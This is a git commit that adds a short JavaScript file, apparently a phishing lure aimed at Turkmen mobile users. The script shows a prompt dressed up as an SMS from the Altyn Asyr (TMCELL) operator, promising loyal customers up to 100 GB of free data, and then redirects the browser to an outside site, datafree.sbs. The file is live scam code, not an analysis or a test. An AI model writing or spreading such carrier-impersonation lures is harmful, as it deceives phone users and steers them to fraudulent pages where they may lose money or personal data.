ae7e81705d471cb8c53af76846e51d105f47b5c2
mmainomi <akparawa247@gmail.com>
2025-03-26 23:07:23 -0700

    Create activation-altyn-asyr-freedata.js

---
+++ activation-altyn-asyr-freedata.js
@@ -0,0 +1,6 @@
+
+var password = 'Mugt maglumat'
+password=prompt('SMS: Hormatly müşderi, Altyn Asyr (TMCELL) Sim kartaňyzyň 5 Gb-dan 100 Gb-a çenli maglumat almaga ukyplydygyny ýa-da ýokdugyny barlaň, Köne Müşderiler sylag, Indi barlamak üçin MUGT DATA basyň ','Mugt maglumat');
+if (password != 'Mugt maglumat') {
+location.href='https://datafree.sbs/altyn-asyr-freedata.html';
+}
